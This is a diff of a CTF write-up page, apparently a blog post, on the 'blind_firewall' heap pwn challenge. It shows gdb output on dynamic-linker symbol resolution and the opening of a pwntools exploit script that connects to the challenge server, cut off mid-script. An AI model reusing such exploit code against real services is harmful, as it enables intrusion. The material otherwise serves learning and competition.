@@ -327,9 +327,9 @@ For the sake of this writeup , i’ll just explain what is necessary . Well , th
 <p>all the code in the _dl_fixup is trying to locate the position of the right string of the function in this section that is called <code class="language-plaintext highlighter-rouge">.dynstr</code></p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">info</span> <span class="n">files</span>
-<span class="n">Symbols</span> <span class="k">from</span> <span class="sh">"</span><span class="s">/home/kali/Desktop/CTFs/quals_2024/pwn/blind_firewall/player/main</span><span class="sh">"</span><span class="p">.</span>
+<span class="n">Symbols</span> <span class="k">from</span> <span class="s">"/home/kali/Desktop/CTFs/quals_2024/pwn/blind_firewall/player/main"</span><span class="p">.</span>
 <span class="n">Local</span> <span class="k">exec</span> <span class="nb">file</span><span class="p">:</span>
-        <span class="err">`</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">quals_2024</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">blind_firewall</span><span class="o">/</span><span class="n">player</span><span class="o">/</span><span class="n">main</span><span class="sh">'</span><span class="s">, file type elf64-x86-64.
+        <span class="err">`</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">CTFs</span><span class="o">/</span><span class="n">quals_2024</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">blind_firewall</span><span class="o">/</span><span class="n">player</span><span class="o">/</span><span class="n">main</span><span class="s">', file type elf64-x86-64.
         Entry point: 0x1170
         0x0000000000000318 - 0x0000000000000334 is .interp
         0x0000000000000338 - 0x0000000000000368 is .note.gnu.property
@@ -359,26 +359,26 @@ For the sake of this writeup , i’ll just explain what is necessary . Well , th
         0x0000000000004060 - 0x0000000000004070 is .data
         0x0000000000004080 - 0x0000000000004188 is .bss
 gef➤  x/20s 0x00000000000005b0
-0x5b0:  </span><span class="sh">""</span><span class="s">
-0x5b1:  </span><span class="sh">"</span><span class="s">__cxa_finalize</span><span class="sh">"</span><span class="s">
-0x5c0:  </span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="s">
-0x5c5:  </span><span class="sh">"</span><span class="s">malloc</span><span class="sh">"</span><span class="s">
-0x5cc:  </span><span class="sh">"</span><span class="s">__libc_start_main</span><span class="sh">"</span><span class="s">
-0x5de:  </span><span class="sh">"</span><span class="s">setvbuf</span><span class="sh">"</span><span class="s">
-0x5e6:  </span><span class="sh">"</span><span class="s">stdout</span><span class="sh">"</span><span class="s">
-0x5ed:  </span><span class="sh">"</span><span class="s">puts</span><span class="sh">"</span><span class="s">
-0x5f2:  </span><span class="sh">"</span><span class="s">free</span><span class="sh">"</span><span class="s">
-0x5f7:  </span><span class="sh">"</span><span class="s">strncpy</span><span class="sh">"</span><span class="s">
-0x5ff:  </span><span class="sh">"</span><span class="s">stdin</span><span class="sh">"</span><span class="s">
-0x605:  </span><span class="sh">"</span><span class="s">__isoc99_scanf</span><span class="sh">"</span><span class="s">
-0x614:  </span><span class="sh">"</span><span class="s">stderr</span><span class="sh">"</span><span class="s">
-0x61b:  </span><span class="sh">"</span><span class="s">exit</span><span class="sh">"</span><span class="s">
-0x620:  </span><span class="sh">"</span><span class="s">__stack_chk_fail</span><span class="sh">"</span><span class="s">
-0x631:  </span><span class="sh">"</span><span class="s">printf</span><span class="sh">"</span><span class="s">
-0x638:  </span><span class="sh">"</span><span class="s">libc.so.6</span><span class="sh">"</span><span class="s">
-0x642:  </span><span class="sh">"</span><span class="s">GLIBC_2.7</span><span class="sh">"</span><span class="s">
-0x64c:  </span><span class="sh">"</span><span class="s">GLIBC_2.4</span><span class="sh">"</span><span class="s">
-0x656:  </span><span class="sh">"</span><span class="s">GLIBC_2.34</span><span class="sh">"</span><span class="s">
+0x5b0:  ""
+0x5b1:  "__cxa_finalize"
+0x5c0:  "read"
+0x5c5:  "malloc"
+0x5cc:  "__libc_start_main"
+0x5de:  "setvbuf"
+0x5e6:  "stdout"
+0x5ed:  "puts"
+0x5f2:  "free"
+0x5f7:  "strncpy"
+0x5ff:  "stdin"
+0x605:  "__isoc99_scanf"
+0x614:  "stderr"
+0x61b:  "exit"
+0x620:  "__stack_chk_fail"
+0x631:  "printf"
+0x638:  "libc.so.6"
+0x642:  "GLIBC_2.7"
+0x64c:  "GLIBC_2.4"
+0x656:  "GLIBC_2.34"
 
 </span></code></pre></div></div>
 
@@ -388,9 +388,9 @@ gef➤  x/20s 0x00000000000005b0
 For quick recap , the .dynamic holds either pointers or offsets to every section in the shared object (in our case the binary itself) , like got , got.plt , dynstr , …..</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x00005555555545b0</span> <span class="o">-</span> <span class="mh">0x00005555555546b2</span> <span class="ow">is</span> <span class="p">.</span><span class="n">dynstr</span>
-<span class="bp">...</span>
+<span class="p">...</span>
 <span class="mh">0x0000555555557df0</span> <span class="o">-</span> <span class="mh">0x0000555555557fd0</span> <span class="ow">is</span> <span class="p">.</span><span class="n">dynamic</span>
-<span class="bp">...</span>
+<span class="p">...</span>
 
 <span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">gx</span> <span class="mh">0x0000555555557df0</span>
 <span class="mh">0x555555557df0</span><span class="p">:</span> <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000088</span>
@@ -414,26 +414,26 @@ For quick recap , the .dynamic holds either pointers or offsets to every section
 <span class="mh">0x555555557f10</span><span class="p">:</span> <span class="mh">0x0000000000000008</span>      <span class="mh">0x0000000000000120</span>
 <span class="mh">0x555555557f20</span><span class="p">:</span> <span class="mh">0x0000000000000009</span>      <span class="mh">0x0000000000000018</span>
 <span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">s</span> <span class="mh">0x00005555555545b0</span>
-<span class="mh">0x5555555545b0</span><span class="p">:</span> <span class="sh">""</span>
-<span class="mh">0x5555555545b1</span><span class="p">:</span> <span class="sh">"</span><span class="s">__cxa_finalize</span><span class="sh">"</span>
-<span class="mh">0x5555555545c0</span><span class="p">:</span> <span class="sh">"</span><span class="s">read</span><span class="sh">"</span>
-<span class="mh">0x5555555545c5</span><span class="p">:</span> <span class="sh">"</span><span class="s">malloc</span><span class="sh">"</span>
-<span class="mh">0x5555555545cc</span><span class="p">:</span> <span class="sh">"</span><span class="s">__libc_start_main</span><span class="sh">"</span>
-<span class="mh">0x5555555545de</span><span class="p">:</span> <span class="sh">"</span><span class="s">setvbuf</span><span class="sh">"</span>
-<span class="mh">0x5555555545e6</span><span class="p">:</span> <span class="sh">"</span><span class="s">stdout</span><span class="sh">"</span>
-<span class="mh">0x5555555545ed</span><span class="p">:</span> <span class="sh">"</span><span class="s">puts</span><span class="sh">"</span>
-<span class="mh">0x5555555545f2</span><span class="p">:</span> <span class="sh">"</span><span class="s">free</span><span class="sh">"</span>
-<span class="mh">0x5555555545f7</span><span class="p">:</span> <span class="sh">"</span><span class="s">strncpy</span><span class="sh">"</span>
-<span class="mh">0x5555555545ff</span><span class="p">:</span> <span class="sh">"</span><span class="s">stdin</span><span class="sh">"</span>
-<span class="mh">0x555555554605</span><span class="p">:</span> <span class="sh">"</span><span class="s">__isoc99_scanf</span><span class="sh">"</span>
-<span class="mh">0x555555554614</span><span class="p">:</span> <span class="sh">"</span><span class="s">stderr</span><span class="sh">"</span>
-<span class="mh">0x55555555461b</span><span class="p">:</span> <span class="sh">"</span><span class="s">exit</span><span class="sh">"</span>
-<span class="mh">0x555555554620</span><span class="p">:</span> <span class="sh">"</span><span class="s">__stack_chk_fail</span><span class="sh">"</span>
-<span class="mh">0x555555554631</span><span class="p">:</span> <span class="sh">"</span><span class="s">printf</span><span class="sh">"</span>
-<span class="mh">0x555555554638</span><span class="p">:</span> <span class="sh">"</span><span class="s">libc.so.6</span><span class="sh">"</span>
-<span class="mh">0x555555554642</span><span class="p">:</span> <span class="sh">"</span><span class="s">GLIBC_2.7</span><span class="sh">"</span>
-<span class="mh">0x55555555464c</span><span class="p">:</span> <span class="sh">"</span><span class="s">GLIBC_2.4</span><span class="sh">"</span>
-<span class="mh">0x555555554656</span><span class="p">:</span> <span class="sh">"</span><span class="s">GLIBC_2.34</span><span class="sh">"</span>
+<span class="mh">0x5555555545b0</span><span class="p">:</span> <span class="s">""</span>
+<span class="mh">0x5555555545b1</span><span class="p">:</span> <span class="s">"__cxa_finalize"</span>
+<span class="mh">0x5555555545c0</span><span class="p">:</span> <span class="s">"read"</span>
+<span class="mh">0x5555555545c5</span><span class="p">:</span> <span class="s">"malloc"</span>
+<span class="mh">0x5555555545cc</span><span class="p">:</span> <span class="s">"__libc_start_main"</span>
+<span class="mh">0x5555555545de</span><span class="p">:</span> <span class="s">"setvbuf"</span>
+<span class="mh">0x5555555545e6</span><span class="p">:</span> <span class="s">"stdout"</span>
+<span class="mh">0x5555555545ed</span><span class="p">:</span> <span class="s">"puts"</span>
+<span class="mh">0x5555555545f2</span><span class="p">:</span> <span class="s">"free"</span>
+<span class="mh">0x5555555545f7</span><span class="p">:</span> <span class="s">"strncpy"</span>
+<span class="mh">0x5555555545ff</span><span class="p">:</span> <span class="s">"stdin"</span>
+<span class="mh">0x555555554605</span><span class="p">:</span> <span class="s">"__isoc99_scanf"</span>
+<span class="mh">0x555555554614</span><span class="p">:</span> <span class="s">"stderr"</span>
+<span class="mh">0x55555555461b</span><span class="p">:</span> <span class="s">"exit"</span>
+<span class="mh">0x555555554620</span><span class="p">:</span> <span class="s">"__stack_chk_fail"</span>
+<span class="mh">0x555555554631</span><span class="p">:</span> <span class="s">"printf"</span>
+<span class="mh">0x555555554638</span><span class="p">:</span> <span class="s">"libc.so.6"</span>
+<span class="mh">0x555555554642</span><span class="p">:</span> <span class="s">"GLIBC_2.7"</span>
+<span class="mh">0x55555555464c</span><span class="p">:</span> <span class="s">"GLIBC_2.4"</span>
+<span class="mh">0x555555554656</span><span class="p">:</span> <span class="s">"GLIBC_2.34"</span>
 
 </code></pre></div></div>
 
@@ -461,26 +461,26 @@ For quick recap , the .dynamic holds either pointers or offsets to every section
 <span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">2</span><span class="n">gx</span> <span class="mh">0x0000555555557e70</span>
 <span class="mh">0x555555557e70</span><span class="p">:</span> <span class="mh">0x0000000000000005</span>      <span class="mh">0x00005555555545b0</span>
 <span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">s</span> <span class="mh">0x00005555555545b0</span>
-<span class="mh">0x5555555545b0</span><span class="p">:</span> <span class="sh">""</span>
-<span class="mh">0x5555555545b1</span><span class="p">:</span> <span class="sh">"</span><span class="s">__cxa_finalize</span><span class="sh">"</span>
-<span class="mh">0x5555555545c0</span><span class="p">:</span> <span class="sh">"</span><span class="s">read</span><span class="sh">"</span>
-<span class="mh">0x5555555545c5</span><span class="p">:</span> <span class="sh">"</span><span class="s">malloc</span><span class="sh">"</span>
-<span class="mh">0x5555555545cc</span><span class="p">:</span> <span class="sh">"</span><span class="s">__libc_start_main</span><span class="sh">"</span>
-<span class="mh">0x5555555545de</span><span class="p">:</span> <span class="sh">"</span><span class="s">setvbuf</span><span class="sh">"</span>
-<span class="mh">0x5555555545e6</span><span class="p">:</span> <span class="sh">"</span><span class="s">stdout</span><span class="sh">"</span>
-<span class="mh">0x5555555545ed</span><span class="p">:</span> <span class="sh">"</span><span class="s">puts</span><span class="sh">"</span>
-<span class="mh">0x5555555545f2</span><span class="p">:</span> <span class="sh">"</span><span class="s">free</span><span class="sh">"</span>
-<span class="mh">0x5555555545f7</span><span class="p">:</span> <span class="sh">"</span><span class="s">strncpy</span><span class="sh">"</span>
-<span class="mh">0x5555555545ff</span><span class="p">:</span> <span class="sh">"</span><span class="s">stdin</span><span class="sh">"</span>
-<span class="mh">0x555555554605</span><span class="p">:</span> <span class="sh">"</span><span class="s">__isoc99_scanf</span><span class="sh">"</span>
-<span class="mh">0x555555554614</span><span class="p">:</span> <span class="sh">"</span><span class="s">stderr</span><span class="sh">"</span>
-<span class="mh">0x55555555461b</span><span class="p">:</span> <span class="sh">"</span><span class="s">exit</span><span class="sh">"</span>
-<span class="mh">0x555555554620</span><span class="p">:</span> <span class="sh">"</span><span class="s">__stack_chk_fail</span><span class="sh">"</span>
-<span class="mh">0x555555554631</span><span class="p">:</span> <span class="sh">"</span><span class="s">printf</span><span class="sh">"</span>
-<span class="mh">0x555555554638</span><span class="p">:</span> <span class="sh">"</span><span class="s">libc.so.6</span><span class="sh">"</span>
-<span class="mh">0x555555554642</span><span class="p">:</span> <span class="sh">"</span><span class="s">GLIBC_2.7</span><span class="sh">"</span>
-<span class="mh">0x55555555464c</span><span class="p">:</span> <span class="sh">"</span><span class="s">GLIBC_2.4</span><span class="sh">"</span>
-<span class="mh">0x555555554656</span><span class="p">:</span> <span class="sh">"</span><span class="s">GLIBC_2.34</span><span class="sh">"</span>
+<span class="mh">0x5555555545b0</span><span class="p">:</span> <span class="s">""</span>
+<span class="mh">0x5555555545b1</span><span class="p">:</span> <span class="s">"__cxa_finalize"</span>
+<span class="mh">0x5555555545c0</span><span class="p">:</span> <span class="s">"read"</span>
+<span class="mh">0x5555555545c5</span><span class="p">:</span> <span class="s">"malloc"</span>
+<span class="mh">0x5555555545cc</span><span class="p">:</span> <span class="s">"__libc_start_main"</span>
+<span class="mh">0x5555555545de</span><span class="p">:</span> <span class="s">"setvbuf"</span>
+<span class="mh">0x5555555545e6</span><span class="p">:</span> <span class="s">"stdout"</span>
+<span class="mh">0x5555555545ed</span><span class="p">:</span> <span class="s">"puts"</span>
+<span class="mh">0x5555555545f2</span><span class="p">:</span> <span class="s">"free"</span>
+<span class="mh">0x5555555545f7</span><span class="p">:</span> <span class="s">"strncpy"</span>
+<span class="mh">0x5555555545ff</span><span class="p">:</span> <span class="s">"stdin"</span>
+<span class="mh">0x555555554605</span><span class="p">:</span> <span class="s">"__isoc99_scanf"</span>
+<span class="mh">0x555555554614</span><span class="p">:</span> <span class="s">"stderr"</span>
+<span class="mh">0x55555555461b</span><span class="p">:</span> <span class="s">"exit"</span>
+<span class="mh">0x555555554620</span><span class="p">:</span> <span class="s">"__stack_chk_fail"</span>
+<span class="mh">0x555555554631</span><span class="p">:</span> <span class="s">"printf"</span>
+<span class="mh">0x555555554638</span><span class="p">:</span> <span class="s">"libc.so.6"</span>
+<span class="mh">0x555555554642</span><span class="p">:</span> <span class="s">"GLIBC_2.7"</span>
+<span class="mh">0x55555555464c</span><span class="p">:</span> <span class="s">"GLIBC_2.4"</span>
+<span class="mh">0x555555554656</span><span class="p">:</span> <span class="s">"GLIBC_2.34"</span>
 <span class="n">gef</span><span class="err">➤</span>  <span class="n">vmmap</span> <span class="mh">0x7ffff7ffe2c0</span>
 <span class="p">[</span> <span class="n">Legend</span><span class="p">:</span>  <span class="n">Code</span> <span class="o">|</span> <span class="n">Heap</span> <span class="o">|</span> <span class="n">Stack</span> <span class="p">]</span>
 <span class="n">Start</span>              <span class="n">End</span>                <span class="n">Offset</span>             <span class="n">Perm</span> <span class="n">Path</span>
@@ -518,158 +518,158 @@ It pushed me to my limits and i ended up learning a lot . Kudos to the author Mo
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
 </span>
-<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
-<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 
 <span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
         <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
-                <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="sh">'''</span><span class="s">
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
                         x/40gx &amp;rules
                         b* copy_rule+275
-                        </span><span class="sh">'''</span><span class="p">)</span>
+                        '''</span><span class="p">)</span>
 <span class="c1">###############   files setup   ###############
-</span><span class="n">local</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
-<span class="n">exe</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./main_patched</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">libc</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">nc</span><span class="o">=</span><span class="sh">"</span><span class="s">nc 34.165.180.62 5001</span><span class="sh">"</span>
-<span class="n">port</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
-<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main_patched"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc 34.165.180.62 5001"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
 
 <span class="c1">############### remote or local ###############
 </span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
-        <span class="n">p</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
-        <span class="n">p</span><span class="o">=</span><span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
 
 <span class="c1">############### helper functions ##############
 </span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
         <span class="k">pass</span>
 
 <span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>   <span class="c1"># between 0x500 and 0x800
-</span>        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span>        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">setin</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload1</span><span class="p">:</span><span class="nb">bytes</span><span class="p">,</span><span class="n">payload2</span><span class="p">:</span><span class="nb">bytes</span><span class="p">):</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">7</span><span class="sh">"</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
-        <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
-        <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"7"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">setout</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload1</span><span class="p">:</span><span class="nb">bytes</span><span class="p">,</span><span class="n">payload2</span><span class="p">:</span><span class="nb">bytes</span><span class="p">):</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">8</span><span class="sh">"</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
-        <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
-        <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"8"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">link</span><span class="p">(</span><span class="n">rule1</span><span class="p">,</span><span class="n">rule2</span><span class="p">):</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">6</span><span class="sh">"</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">rule1</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">rule2</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"6"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rule1</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rule2</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
 
 <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload</span><span class="p">,</span><span class="n">newline</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">)</span>
-        <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
         <span class="k">if</span> <span class="n">newline</span><span class="p">:</span>
-                <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
-                <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
-                <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-                <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 <span class="c1">############### main exploit    ###############
 #p.close()
 </span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
 
         <span class="k">try</span> <span class="p">:</span>
-                <span class="n">p</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
-                <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">Your ID: </span><span class="sh">"</span><span class="p">)</span>
-                <span class="n">leak</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+                <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+                <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your ID: "</span><span class="p">)</span>
+                <span class="n">leak</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
